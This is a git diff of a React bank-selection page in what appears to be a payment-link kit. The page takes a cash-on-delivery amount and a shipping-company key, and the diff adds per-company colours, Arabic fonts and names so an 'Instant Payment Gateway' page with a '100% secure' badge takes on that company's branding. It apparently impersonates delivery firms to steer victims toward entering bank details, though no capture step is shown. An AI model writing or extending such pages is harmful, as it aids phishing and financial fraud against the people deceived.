@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useMemo, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { useUpdateLink } from "@/hooks/useSupabase";
 import { useLinkData } from "@/hooks/useLinkData";
@@ -8,6 +8,9 @@ import { getCountryByCode } from "@/lib/countries";
 import { Input } from "@/components/ui/input";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { formatCurrency } from "@/lib/countryCurrencies";
+import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";
+import { getServiceBranding } from "@/lib/serviceLogos";
+import { shippingCompanyBranding } from "@/lib/brandingSystem";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -15,12 +18,54 @@ const PaymentBankSelector = () => {
   const { data: linkData, isLoading } = useLinkData(id);
   const updateLink = useUpdateLink();
   const [searchTerm, setSearchTerm] = useState("");
-  
+
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
   const countryData = getCountryByCode(selectedCountry);
   const banks = getBanksByCountry(selectedCountry);
   const rawAmount = linkData?.payload?.cod_amount || 500;
   const formattedAmount = formatCurrency(rawAmount, selectedCountry);
+
+  const companyKey = linkData?.payload?.service_key || '';
+  const serviceBranding = getServiceBranding(companyKey);
+  const companyBranding = companyKey ? shippingCompanyBranding[companyKey.toLowerCase()] : null;
+
+  // Get entity visual spec
+  const entitySpec = useMemo(() => {
+    if (companyKey) {
+      return getEntityVisualSpec(companyKey);
+    }
+    return null;
+  }, [companyKey]);
+
+  // Apply entity CSS variables
+  useEffect(() => {
+    if (entitySpec) {
+      const cssVars = specToCSSVariables(entitySpec);
+      const root = document.documentElement;
+      Object.entries(cssVars).forEach(([key, value]) => {
+        root.style.setProperty(key, value);
+      });
+      root.setAttribute('data-entity', entitySpec.entityId);
+      root.setAttribute('data-entity-category', entitySpec.category);
+    }
+    return () => {
+      const root = document.documentElement;
+      root.removeAttribute('data-entity');
+      root.removeAttribute('data-entity-category');
+    };
+  }, [entitySpec]);
+
+  // Visual values
+  const primaryColor = entitySpec?.colors.primary || companyBranding?.colors.primary || serviceBranding.colors.primary;
+  const backgroundColor = entitySpec?.colors.background || companyBranding?.colors.background || '#F8FAFC';
+  const surfaceColor = entitySpec?.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
+  const textColor = entitySpec?.colors.text || companyBranding?.colors.text || '#1A1A1A';
+  const textLightColor = entitySpec?.colors.textLight || companyBranding?.colors.textLight || '#666666';
+  const borderColor = entitySpec?.colors.border || companyBranding?.colors.border || '#E5E5E5';
+  const fontFamily = entitySpec?.typography.fontFamilyAr || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif';
+  const borderRadius = entitySpec?.dimensions.borderRadius || companyBranding?.borderRadius.lg || '16px';
+  const cardShadow = entitySpec?.shadows.card || companyBranding?.shadows.lg || '0 10px 40px rgba(0,0,0,0.1)';
+  const entityNameAr = entitySpec?.entityNameAr || serviceBranding.nameAr || companyKey;
 
   const filteredBanks = banks.filter(bank => {
     const nameMatch = bank.name ? bank.name.toLowerCase().includes(searchTerm.toLowerCase()) : false;
@@ -54,27 +99,27 @@ const PaymentBankSelector = () => {
   );
 
   return (
-    <div className="min-h-screen bg-[#F8FAFC] flex flex-col font-arabic select-none" dir="rtl">
-      <PaymentMetaTags serviceName="اختيار البنك" title="اختر البنك الخاص بك" />
+    <div className="min-h-screen flex flex-col select-none" dir="rtl" style={{ backgroundColor, fontFamily }}>
+      <PaymentMetaTags serviceName={entityNameAr || "اختيار البنك"} title="اختر البنك الخاص بك" />
 
       {/* Modern Slim Header */}
-      <header className="bg-white/80 backdrop-blur-md border-b sticky top-0 z-50 px-4 h-16 sm:h-20 flex items-center">
+      <header className="backdrop-blur-md border-b sticky top-0 z-50 px-4 h-16 sm:h-20 flex items-center" style={{ backgroundColor: `${surfaceColor}CC`, borderColor }}>
         <div className="container mx-auto flex items-center justify-between">
           <div className="flex items-center gap-3">
-            <div className="w-10 h-10 bg-slate-900 rounded-xl flex items-center justify-center text-white shadow-lg shadow-slate-200">
+            <div className="w-10 h-10 rounded-xl flex items-center justify-center text-white shadow-lg" style={{ backgroundColor: primaryColor }}>
               <Building2 className="w-5 h-5" />
             </div>
             <div>
-              <h1 className="text-sm sm:text-base font-black text-slate-900 leading-none">بوابة التحويل الفوري</h1>
-              <p className="text-[8px] sm:text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-1">Instant Payment Gateway</p>
+              <h1 className="text-sm sm:text-base font-bold leading-none" style={{ color: textColor }}>بوابة التحويل الفوري</h1>
+              <p className="text-[8px] sm:text-[9px] font-bold uppercase tracking-widest mt-1" style={{ color: textLightColor }}>Instant Payment Gateway</p>
             </div>
           </div>
           <div className="flex items-center gap-2">
-             <div className="hidden sm:flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-slate-100 text-[10px] font-bold text-slate-600">
+             <div className="hidden sm:flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[10px] font-bold" style={{ backgroundColor: `${textLightColor}08`, color: textLightColor }}>
                 <Globe className="w-3 h-3" />
                 <span>English</span>
              </div>
-             <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-green-50 text-green-700 border border-green-100 text-[10px] font-bold">
+             <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-full border text-[10px] font-bold" style={{ backgroundColor: `${primaryColor}08`, color: primaryColor, borderColor: `${primaryColor}20` }}>
                 <Lock className="w-3 h-3" />
                 <span>آمن 100%</span>
              </div>
